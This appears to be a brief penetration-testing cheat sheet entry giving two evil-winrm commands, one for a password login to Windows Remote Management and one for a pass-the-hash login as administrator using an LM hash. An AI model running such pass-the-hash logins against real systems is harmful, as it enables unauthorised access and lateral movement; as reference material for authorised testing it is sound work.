Connect to winrm using username and password authentication:
```
evil-winrm -i <FQDN or ip> -u <username> -p <password>
```

Connect to winrm using a pass-the-hash attack with an LM hash:
```
evil-winrm -i <FQDN or ip> -u administrator -H "<LM hash>"
```

